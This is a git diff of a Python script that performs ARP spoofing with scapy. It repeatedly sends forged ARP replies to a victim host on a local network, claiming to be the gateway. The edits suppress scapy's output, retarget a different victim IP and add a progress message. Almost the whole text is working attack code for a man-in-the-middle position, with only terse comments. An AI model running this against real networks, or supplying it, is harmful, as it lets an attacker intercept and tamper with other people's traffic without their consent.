@@ -15,10 +15,10 @@ def get_mac(ip):
 #(target_ip=victim, spoof_ip=who i pretend)
 def spoof_target(target_ip,target_mac, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 
-victim_ip = "10.0.0.74"
+victim_ip = "10.0.0.82"
 gtw_ip    = "10.0.0.1"
 
 victim_mac = get_mac(victim_ip)#get mac of victim
@@ -29,4 +29,5 @@ print("Router " + gtw_ip + " with MAC " + gtw_mac)
 while True:
     spoof_target(victim_ip,victim_mac,gtw_ip)
     #spoof_target(gtw_ip,gtw_mac,victim_ip)#spoofing the gw make it wont work!?
+    print("Packets sent")
     time.sleep(2)
